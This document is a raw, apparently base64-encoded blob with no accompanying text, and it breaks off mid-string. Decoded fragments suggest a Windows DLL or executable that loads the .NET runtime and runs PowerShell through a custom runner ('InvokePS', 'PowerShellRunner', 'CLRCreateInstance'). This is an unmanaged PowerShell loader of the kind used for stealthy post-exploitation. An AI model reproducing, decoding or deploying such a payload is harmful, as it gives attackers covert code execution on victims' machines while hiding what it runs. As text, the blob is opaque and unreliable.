UlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FBQUFTUUJ1QUhZQWJ3QnJBR1VBVUFCVEFBQUFBQUFBQUFBQWpSaUFrbzRPWjBpekRIK29PSVRvM20wQWN3QmpBRzhBY2dCbEFHVUFMZ0JrQUd3QWJBQUFBSFlBTWdBdUFEQUFMZ0ExQURBQU53QXlBRGNBQUFBQUFIWUFOQUF1QURBQUxnQXpBREFBTXdBeEFEa0FBQUFBQUVOTVVrTnlaV0YwWlVsdWMzUmhibU5sQUFBQUFBQUFBRU1BYndCMUFHd0FaQUFnQUc0QWJ3QjBBQ0FBWmdCcEFHNEFaQUFnQUM0QVRnQkZBRlFBSUFBMEFDNEFNQUFnQUVFQVVBQkpBQ0FBUXdCTUFGSUFRd0J5QUdVQVlRQjBBR1VBU1FCdUFITUFkQUJoQUc0QVl3QmxBQUFBQUFBQUFFTUFUQUJTQUVNQWNnQmxBR0VBZEFCbEFFa0FiZ0J6QUhRQVlRQnVBR01BWlFBZ0FHWUFZUUJwQUd3QVpRQmtBQ0FBZHdBdkFHZ0FjZ0FnQURBQWVBQWxBREFBT0FCc0FIZ0FDZ0FBQUFBQVNRQkRBRXdBVWdCTkFHVUFkQUJoQUVnQWJ3QnpBSFFBT2dBNkFFY0FaUUIwQUZJQWRRQnVBSFFBYVFCdEFHVUFJQUJtQUdFQWFRQnNBR1VBWkFBZ0FIY0FMd0JvQUhJQUlBQXdBSGdBSlFBd0FEZ0FiQUI0QUFvQUFBQUFBQUFBU1FCREFFd0FVZ0JTQUhVQWJnQjBBR2tBYlFCbEFFa0FiZ0JtQUc4QU9nQTZBRWtBY3dCTUFHOEFZUUJrQUdFQVlnQnNBR1VBSUFCbUFHRUFhUUJzQUdVQVpBQWdBSGNBTHdCb0FISUFJQUF3QUhnQUpRQXdBRGdBYkFCNEFBb0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFDNEFUZ0JGQUZRQUlBQnlBSFVBYmdCMEFHa0FiUUJsQUNBQWRnQXlBQzRBTUFBdUFEVUFNQUEzQURJQU53QWdBR01BWVFCdUFHNEFid0IwQUNBQVlnQmxBQ0FBYkFCdkFHRUFaQUJsQUdRQUNnQUFBQUFBQUFBQUFBQUFBQUFBQUVrQVF3Qk1BRklBVWdCMUFHNEFkQUJwQUcwQVpRQkpBRzRBWmdCdkFEb0FPZ0JIQUdVQWRBQkpBRzRBZEFCbEFISUFaZ0JoQUdNQVpRQWdBR1lBWVFCcEFHd0FaUUJrQUNBQWR3QXZBR2dBY2dBZ0FEQUFlQUFsQURBQU9BQnNBSGdBQ2dBQUFBQUFBQUFBQUFBQUFBQkRBRzhBZFFCc0FHUUFJQUJ1QUc4QWRBQWdBR1lBYVFCdUFHUUFJQUJCQUZBQVNRQWdBRU1BYndCeUFFSUFhUUJ1QUdRQVZBQnZBRklBZFFCdUFIUUFhUUJ0QUdVQUFBQjNBR3NBY3dBQUFFTUFid0J5QUVJQWFRQnVBR1FBVkFCdkFGSUFkUUJ1QUhRQWFRQnRBR1VBSUFCbUFHRUFhUUJzQUdVQVpBQWdBSGNBTHdCb0FISUFJQUF3QUhnQUpRQXdBRGdBYkFCNEFBb0FBQUFBQUFBQVV3QmhBR1lBWlFCQkFISUFjZ0JoQUhrQVVBQjFBSFFBUlFCc0FHVUFiUUJsQUc0QWRBQWdBR1lBWVFCcEFHd0FaUUJrQUNBQWR3QXZBR2dBY2dBZ0FEQUFlQUFsQURBQU9BQnNBSGdBQ2dBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUmdCaEFHa0FiQUJsQUdRQUlBQjBBRzhBSUFCcEFHNEFkZ0J2QUdzQVpRQWdBRWtBYmdCMkFHOEFhd0JsQUZBQVV3QWdBSGNBTHdCb0FISUFJQUF3QUhnQUpRQXdBRGdBYkFCNEFBb0FBQUJRYjNkbGNsTm9aV3hzVW5WdWJtVnlBQUFBQUFBQUFBQlFiM2RsY2xOb1pXeHNVblZ1Ym1WeUxsQnZkMlZ5VTJobGJHeFNkVzV1WlhJQUFBQUFBQUFBUmdCaEFHa0FiQUJsQUdRQUlBQjBBRzhBSUFCakFISUFaUUJoQUhRQVpRQWdBSFFBYUFCbEFDQUFjZ0IxQUc0QWRBQnBBRzBBWlFBZ0FHZ0Fid0J6QUhRQUNnQUFBQUFBQUFBQUFBQUFBQUJEQUV3QVVnQWdBR1lBWVFCcEFHd0FaUUJrQUNBQWRBQnZBQ0FBY3dCMEFHRUFjZ0IwQUNBQWR3QXZBR2dBY2dBZ0FEQUFlQUFsQURBQU9BQnNBSGdBQ2dBQUFBQUFBQUFBQUFBQUFBQUFBRklBZFFCdUFIUUFhUUJ0QUdVQVF3QnNBSElBU0FCdkFITUFkQUE2QURvQVJ3QmxBSFFBUXdCMUFISUFjZ0JsQUc0QWRBQkJBSEFBY0FCRUFHOEFiUUJoQUdrQWJnQkpBR1FBSUFCbUFHRUFhUUJzQUdVQVpBQWdBSGNBTHdCb0FISUFJQUF3QUhnQUpRQXdBRGdBYkFCNEFBb0FBQUFBQUFBQUFBQUFBQUFBU1FCREFHOEFjZ0JTQUhVQWJnQjBBR2tBYlFCbEFFZ0Fid0J6QUhRQU9nQTZBRWNBWlFCMEFFUUFaUUJtQUdFQWRRQnNBSFFBUkFCdkFHMEFZUUJwQUc0QUlBQm1BR0VBYVFCc0FHVUFaQUFnQUhjQUx3Qm9BSElBSUFBd0FIZ0FKUUF3QURnQWJBQjRBQW9BQUFBQUFFWUFZUUJwQUd3QVpRQmtBQ0FBZEFCdkFDQUFad0JsQUhRQUlBQmtBR1VBWmdCaEFIVUFiQUIwQUNBQVFRQndBSEFBUkFCdkFHMEFZUUJwQUc0QUlBQjNBQzhBYUFCeUFDQUFNQUI0QUNVQU1BQTRBR3dBZUFBS0FBQUFBQUFBQUVZQVlRQnBBR3dBWlFCa0FDQUFkQUJ2QUNBQWJBQnZBR0VBWkFBZ0FIUUFhQUJsQUNBQVlRQnpBSE1BWlFCdEFHSUFiQUI1QUNBQWR3QXZBR2dBY2dBZ0FEQUFlQUFsQURBQU9BQnNBSGdBQ2dBQUFBQUFBQUFBQUFBQUFBQUFBRVlBWVFCcEFHd0FaUUJrQUNBQWRBQnZBQ0FBWndCbEFIUUFJQUIwQUdnQVpRQWdBRlFBZVFCd0FHVUFJQUJwQUc0QWRBQmxBSElBWmdCaEFHTUFaUUFnQUhjQUx3Qm9BSElBSUFBd0FIZ0FKUUF3QURnQWJBQjRBQW9BQUFBQUFOeVc5Z1VwSzJNMnJZdkVPSnp5cHhNaVp5L0xPcXZTRVp4QUFNQlBvd28rMHRFNXZTKzZha2lKc0xTd3kwWm9rWjdiTXRPenVTVkJnZ2VoU0lUMU1oWk5XcEFBQXdBQUFBUUFBQUQvL3dBQXVBQUFBQUFBQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDQUFBQUFEaCs2RGdDMENjMGh1QUZNelNGVWFHbHpJSEJ5YjJkeVlXMGdZMkZ1Ym05MElHSmxJSEoxYmlCcGJpQkVUMU1nYlc5a1pTNE5EUW9rQUFBQUFBQUFBRkJGQUFCTUFRTUFXYkhoVndBQUFBQUFBQUFBNEFBQ0lRc0JNQUFBTEFBQUFBWUFBQUFBQUFEV1NnQUFBQ0FBQUFCZ0FBQUFBQUFRQUNBQUFBQUNBQUFFQUFBQUFBQUFBQVFBQUFBQUFBQUFBS0FBQUFBQ0FBQUFBQUFBQXdCQWhRQUFFQUFBRUFBQUFBQVFBQUFRQUFBQUFBQUFFQUFBQUFBQUFBQUFBQUFBaEVvQUFFOEFBQUFBWUFBQXVBTUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFnQUFBREFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFnQUFBSUFBQUFBQUFBQUFBQUFBQUlJQUFBU0FBQUFBQUFBQUFBQUFBQUxuUmxlSFFBQUFEY0tnQUFBQ0FBQUFBc0FBQUFBZ0FBQUFBQUFBQUFBQUFBQUFBQUlBQUFZQzV5YzNKakFBQUF1QU1BQUFCZ0FBQUFCQUFBQUM0QUFBQUFBQUFBQUFBQUFBQUFBRUFBQUVBdWNtVnNiMk1BQUF3QUFBQUFnQUFBQUFJQUFBQXlBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQkNBQUFBQUFBQUFBQUFBQUFBQUFBQUFMaEtBQUFBQUFBQVNBQUFBQUlBQlFDWUpBQUE3Q1VBQUFNQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUd6QURBSXdBQUFBQkFBQVJjdzRBQUFZS0tBNEFBQW9MQnhadkR3QUFDZ2NVYnhBQUFBb0dCeWdSQUFBS0RBaHZFZ0FBQ2dodkV3QUFDZzBKYnhRQUFBb0NieFVBQUFvSmJ4UUFBQW9XYnhZQUFBb1lGMjhYQUFBS0NXOFVBQUFLY2dFQUFIQnZHQUFBQ2dsdkdRQUFDaWJlRkFrc0JnbHZHZ0FBQ3R3SUxBWUlieG9BQUFyY0JtOGJBQUFLZEFRQUFBSnZHZ0FBQmlvQkhBQUFBZ0F2QURobkFBb0FBQUFBQWdBaUFFOXhBQW9BQUFBQUhnSW9IQUFBQ2lvZUFuc0JBQUFFS2hweUdRQUFjQ29pRnhaekhRQUFDaW9lQW5zQ0FBQUVLaTRvSGdBQUNtOGZBQUFLS2k0b0hnQUFDbThnQUFBS0tpNXlNUUFBY0hNaEFBQUtlaTV5cWdFQWNITWhBQUFLZWdZcWRnSW9JZ0FBQ24wQkFBQUVBbk1QQUFBR2ZRSUFBQVFDS0NNQUFBb3FkZ0p6T3dBQUJuMEVBQUFFQWlna0FBQUtBbk1sQUFBS2ZRTUFBQVFxT2dKN0F3QUFCQVZ2SmdBQUNpWXFTZ0o3QXdBQUJISWhBd0J3YnlZQUFBb21LbUlDZXdNQUFBUUZjaUVEQUhBb0p3QUFDbThtQUFBS0ppbzZBbnNEQUFBRUEyOG1BQUFLSmlwaUFuc0RBQUFFY2lVREFIQURLQ2NBQUFwdktBQUFDaVlxWWdKN0F3QUFCSEkxQXdCd0F5Z25BQUFLYnlnQUFBb21Lam9DZXdNQUFBUURieWdBQUFvbUttSUNld01BQUFSeVJRTUFjQU1vSndBQUNtOG9BQUFLSmlwaUFuc0RBQUFFY2xrREFIQURLQ2NBQUFwdktBQUFDaVlxTWdKN0F3QUFCRzhwQUFBS0tpNXliUU1BY0hNaEFBQUtlaTV5MEFRQWNITWhBQUFLZWk1eVJRWUFjSE1oQUFBS2VpNXl4QWNBY0hNaEFBQUtlaDRDZXdRQUFBUXFMbkpEQ1FCd2N5RUFBQXA2TG5LcUNnQndjeUVBQUFwNkhnSjdDUUFBQkNvaUFnTjlDUUFBQkNvZUFuc01BQUFFS2lJQ0EzME1BQUFFS2g0Q2V3WUFBQVFxSWdJRGZRWUFBQVFxSGdKN0J3QUFCQ29pQWdOOUJ3QUFCQ291Y2kwTUFIQnpJUUFBQ25vZUFuc0lBQUFFS2lJQ0EzMElBQUFFS2k1eWR3d0FjSE1oQUFBS2VpNXl3d3dBY0hNaEFBQUtlaDRDZXdvQUFBUXFIZ0o3Q3dBQUJDb3VjZ1VOQUhCeklRQUFDbm91Y21vT0FIQnpJUUFBQ25vdWNyb09BSEJ6SVFBQUNub3VjZ1lQQUhCeklRQUFDbm9lQW5zTkFBQUVLaUlDQTMwTkFBQUVLaDRDZXdVQUFBUXFJZ0lEZlFVQUFBUXFIZ0o3RGdBQUJDb2lBZ045RGdBQUJDb1RNQU1BN0FBQUFBSUFBQkVDRWdEK0ZTVUFBQUVTQUI5NEtDb0FBQW9TQUI5a0tDc0FBQW9HZlFVQUFBUUNFZ0grRlNZQUFBRVNBUllvTEFBQUNoSUJGaWd0QUFBS0IzMEdBQUFFQWhkOUJ3QUFCQUlmRDMwSUFBQUVBaElBL2hVbEFBQUJFZ0FnLy8vL2Z5Z3FBQUFLRWdBZy8vLy9meWdyQUFBS0JuMEtBQUFFQWhJQS9oVWxBQUFCRWdBZlpDZ3FBQUFLRWdBZlpDZ3JBQUFLQm4wTEFBQUVBaElBL2hVbEFBQUJFZ0FmWkNncUFBQUtFZ0FnNkFNQUFDZ3JBQUFLQm4wTUFBQUVBaElCL2hVbUFBQUJFZ0VXS0N3QUFBb1NBUllvTFFBQUNnZDlEUUFBQkFKeVVBOEFjSDBPQUFBRUFpZ3VBQUFLS2tKVFNrSUJBQUVBQUFBQUFBd0FBQUIyTWk0d0xqVXdOekkzQUFBQUFBVUFiQUFBQUhRSkFBQWpmZ0FBNEFrQUFDZ0tBQUFqVTNSeWFXNW5jd0FBQUFBSUZBQUFWQThBQUNOVlV3QmNJd0FBRUFBQUFDTkhWVWxFQUFBQWJDTUFBSUFDQUFBalFteHZZZ0FBQUFBQUFBQUNBQUFCVnhXaUNRa0NBQUFBK2dFekFCWUFBQUVBQUFBMEFBQUFCUUFBQUE0QUFBQTdBQUFBTXdBQUFDNEFBQUFOQUFBQUFnQUFBQU1BQUFBVEFBQUFHd0FBQUFFQUFBQUJBQUFBQWdBQUFBTUFBQUFBQUdVRkFRQUFBQUFBQmdCK0EwUUlCZ0RyQTBRSUJnRExBdFlIRHdCa0NBQUFCZ0R6QWh3R0JnQmhBeHdHQmdCQ0F4d0dCZ0RTQXh3R0JnQ2VBeHdHQmdDM0F4d0dCZ0FLQXh3R0JnRGZBaVVJQmdDOUFpVUlCZ0FsQXh3R0JnQmVDWk1GQ2dDUUF2WUhDZ0F5QWZZSENnQlhBdllIQ2dEaENia0pCZ0NyQUpNRkJnQ3FCWk1GQ2dEakFMa0pCZ0R2QmdjR0JnQUlCL01KQmdEREI1TUZDZ0RIQU40RkJnQU9BRmNBQ2dCY0NkNEZCZ0FCQUVZRkNnRE1CcmtKQ2dEZEJya0pDZ0FsQmQ0RkNnQnpDTjRGQ2dDOENONEZDZ0FWQWJrSkJnRDZCQmNLQ2dEYUJMa0pDZ0N3Q0xrSkNnQjZCYmtKQ2dDVkFia0pDZ0Q3QnJrSkNnRFNDTGtKQmdDb0F0OEVDZ0FyQjk0RkNnQUhDdllIQ2dBdUJ2WUhDZ0N3QVBZSENnQ2NDUFlIQmdDSkFaTUZCZ0NkQU44RUJnQzBCcE1GQmdBSkJaTUZBQUFBQUJzQUFBQUFBQUVBQVFBQkFCQUFRQWRBQnowQUFRQUJBQU1BRUFEYkNRQUFUUUFCQUFNQUF3QVFBTjBBQUFCWkFBTUFEd0FEQUJBQTl3QUFBSTBBQlFBaUFBRUFpZ0N6QUFFQUlRVzNBQUVBVXdDN0FBRUFHZ1cvQUFFQTB3VERBQUVBWmdiSUFBRUFWd1ROQUFFQWVRZlFBQUVBc2dmUUFBRUFtd1REQUFFQXhBVERBQUVBTFFUREFBRUFuQWJJQUFFQXlRSFVBRkFnQUFBQUFKWUFOUURYQUFFQUJDRUFBQUFBaGhqUUJ3WUFBZ0FNSVFBQUFBREdDSElBM0FBQ0FCUWhBQUFBQU1ZSTFnR1VBQUlBR3lFQUFBQUF4Z2ltQmVFQUFnQWtJUUFBQUFER0NDUUFiUUFDQUN3aEFBQUFBTVlJZFFKK0FBSUFPQ0VBQUFBQXhnaGdBbjRBQWdCRUlRQUFBQURHQUpZSkJnQUNBRkFoQUFBQUFNWUFxQWtHQUFJQVhDRUFBQUFBeGdESEJRWUFBZ0JjSVFBQUFBREdBTElGQmdBQ0FGd2hBQUFBQU1ZQWNBa0JBQUlBWGlFQUFBQUFoaGpRQndZQUF3QjhJUUFBQUFDR0dOQUhCZ0FEQUpvaEFBQUFBTVlBdHdMbUFBTUFxU0VBQUFBQXhnQVlBZ1lBQmdDOElRQUFBQURHQUJnQzVnQUdBTlVoQUFBQUFNWUF0d0lRQUFrQTVDRUFBQUFBeGdBekFoQUFDZ0Q5SVFBQUFBREdBRUlDRUFBTEFCWWlBQUFBQU1ZQUdBSVFBQXdBSlNJQUFBQUF4Z0FIQWhBQURRQStJZ0FBQUFER0FDSUNFQUFPQUZ3aEFBQUFBTVlBOWdqdkFBOEFWeUlBQUFBQWhnam9DWlFBRVFCa0lnQUFBQURHQUxJSjlnQVJBSEFpQUFBQUFNWUFPd0VJQVJRQWZDSUFBQUFBeGdBeUJSVUJHQUNJSWdBQUFBREdBRElGSlFFZUFKUWlBQUFBQU1ZSUt3QXZBU0lBbkNJQUFBQUF4Z0R6QVpRQUlnQ29JZ0FBQUFER0FQQUVOUUVpQUxRaUFBQUFBTVlJaWdjN0FTSUF2Q0lBQUFBQXhnaWVCMEFCSWdERklnQUFBQURHQ0E4RVJnRWpBTTBpQUFBQUFNWUlIZ1JNQVNNQTFpSUFBQUFBeGdoQUJsTUJKQURlSWdBQUFBREdDRk1HV1FFa0FPY2lBQUFBQU1ZSU9RUmdBU1VBN3lJQUFBQUF4Z2hJQkFFQUpRRDRJZ0FBQUFER0FCWUhCZ0FtQUFRakFBQUFBTVlJVVFjN0FTWUFEQ01BQUFBQXhnaGxCMEFCSmdBVkl3QUFBQURHQUNnSlpBRW5BQ0VqQUFBQUFNWUllQUZ6QVNnQUxTTUFBQUFBeGdpQkJFWUJLQUExSXdBQUFBREdDTElFUmdFb0FEMGpBQUFBQU1ZQS93bDNBU2dBU1NNQUFBQUF4Z0FUQ1lBQktRQlZJd0FBQUFER0FEb0prQUV0QUdFakFBQUFBTVlBT2dtYUFTOEFiU01BQUFBQXhnaDJCbE1CTVFCMUl3QUFBQURHQ0lrR1dRRXhBSDRqQUFBQUFNWUlZd1JHQVRJQWhpTUFBQUFBeGdoeUJFd0JNZ0NQSXdBQUFBREdDS2tCbEFBekFKY2pBQUFBQU1ZSXVRRVFBRE1Bb0NNQUFBQUFoaGpRQndZQU5BQUFBQUVBdUFBQUFBRUFZQUVBQUFFQWVnY0FBQUlBc3djQUFBTUFDUVFBQUFFQWVnY0FBQUlBc3djQUFBTUFDUVFBQUFFQUNRUUFBQUVBYVFFQUFBRUFDUVFBQUFFQUNRUUFBQUVBYVFFQUFBRUFhUUVBQUFFQWdRQUFBQUlBMWdBQUFBRUFyQVlBQUFJQWFRRUFBQU1BNFFnQUFBRUFyQVlBQUFJQWFRRUFBQU1BSFFnQUFBUUFTd0VBQUFFQXJBWUFBQUlBYVFFQUFBTUEzd0VBQUFRQTZBRUFBQVVBaFFnQUFBWUE3Z2dBQUFFQXJBWUFBQUlBYVFFQUFBTUEzd0VBQUFRQTZBRUFBQUVBQ1FRQUFBRUFDUVFBQUFFQUNRUUFBQUVBQ1FRQUFBRUFDUVFBQUFFQW53RUFBQUVBN2dnQUFBRUFXUUVBQUFJQSt3VUFBQU1BQXdjQUFBUUFoUVVBQUFFQW53RUFBQUlBaFFVQUFBRUFud1VBQUFJQVRBa0FBQUVBQ1FRQUFBRUFDUVFBQUFFQUNRUUpBTkFIQVFBUkFOQUhCZ0FaQU5BSENnQXBBTkFIRUFBeEFOQUhFQUE1QU5BSEVBQkJBTkFIRUFCSkFOQUhFQUJSQU5BSEVBQlpBTkFIRUFCaEFOQUhGUUJwQU5BSEVBQnhBTkFIRUFDQkFINEpKUUNCQUtRQ0tnQ0JBQ2NITVFCcEFTd0JPQUNKQUpvRkJnQ0pBRkVDUVFDUkFPa0hSZ0J4QVl3SkVBQU1BSW9GVkFCNUFRUUpXZ0J4QWFRQUVBQ1JBSEVCWkFDSkFZZ0NCZ0NaQUNRQWJRQjVBTkFIQmdDcEFOQUhjZ0NSQVpJQWVBQ1JBWFVDZmdDUkFXQUNmZ0NaQWRBSEVBQ2hBS2dBZ3dDWkFOQUhCZ0N4QU5BSEJnREJBTkFIQmdEQkFNQUFpQUNoQVZVSmpnREJBUHdCaUFCNUFBY0ZsQUFwQVJBRkFRQXBBV1VKQVFBeEFUNEFBUUF4QVVRQUFRQVpBZEFIQmdBdUFBc0E0UUV1QUJNQTZnRXVBQnNBQ1FJdUFDTUFFZ0l1QUNzQUtBSXVBRE1BS0FJdUFEc0FLQUl1QUVNQUVnSXVBRXNBTGdJdUFGTUFLQUl1QUZzQUtBSXVBR01BUmdJdUFHc0FjQUlhQUpnQUF3QUJBQVFBQndBRkFBa0FBQUIyQUtvQkFBRHVBYThCQUFDcUJiTUJBQUF5QUxnQkFBQjVBcjBCQUFCa0FyMEJBQURzQ2E4QkFBQXZBTUlCQUFDaUI4Z0JBQUFpQk0wQkFBQlhCdE1CQUFCTUJOa0JBQUJwQjhnQkFBQjhBZDBCQUFDRkJNMEJBQUMyQk0wQkFBQ05CdE1CQUFESUJNMEJBQUM5QWE4QkFnQURBQU1BQWdBRUFBVUFBZ0FGQUFjQUFnQUdBQWtBQWdBSEFBc0FBZ0FJQUEwQUFnQWFBQThBQWdBZkFCRUFBZ0FpQUJNQUFRQWpBQk1BQWdBa0FCVUFBUUFsQUJVQUFnQW1BQmNBQVFBbkFCY0FBZ0FvQUJrQUFRQXBBQmtBQWdBckFCc0FBUUFzQUJzQUFnQXVBQjBBQWdBdkFCOEFBZ0F3QUNFQUFnQTFBQ01BQVFBMkFDTUFBZ0EzQUNVQUFRQTRBQ1VBQWdBNUFDY0FBUUE2QUNjQVRBQUVnQUFBQVFBQUFBQUFBQUFBQUFBQUFBQkFCd0FBQWdBQUFBQUFBQUFBQUFBQW9RQktBQUFBQUFBQkFBQUFBQUFBQUFBQUFBQ3FBTjRGQUFBQUFBTUFBZ0FFQUFJQUJRQUNBQUFBQUVOdmJHeGxZM1JwYjI1Z01RQkVhV04wYVc5dVlYSjVZRElBUEUxdlpIVnNaVDRBWjJWMFgxVkpBR2RsZEY5U1lYZFZTUUJKYm5admEyVlFVd0J6WlhSZldBQnpaWFJmV1FCdGMyTnZjbXhwWWdCZmMySUFVM2x6ZEdWdExrTnZiR3hsWTNScGIyNXpMa2RsYm1WeWFXTUFaMlYwWDBsdWMzUmhibU5sU1dRQWMyOTFjbU5sU1dRQVgyaHZjM1JKWkFCblpYUmZRM1Z5Y21WdWRGUm9jbVZoWkFCQlpHUUFUbVYzUjNWcFpBQkRiMjF0WVc1a0FHTnZiVzFoYm1RQVFYQndaVzVrQUZCeWIyZHlaWE56VW1WamIzSmtBSEpsWTI5eVpBQkRkWE4wYjIxUVUwaHZjM1JWYzJWeVNXNTBaWEptWVdObEFFTjFjM1J2YlZCVFVraHZjM1JTWVhkVmMyVnlTVzUwWlhKbVlXTmxBRkJUU0c5emRGSmhkMVZ6WlhKSmJuUmxjbVpoWTJVQVEzSmxZWFJsVW5WdWMzQmhZMlVBVUhKdmJYQjBSbTl5UTJodmFXTmxBR1JsWm1GMWJIUkRhRzlwWTJVQWMyOTFjbU5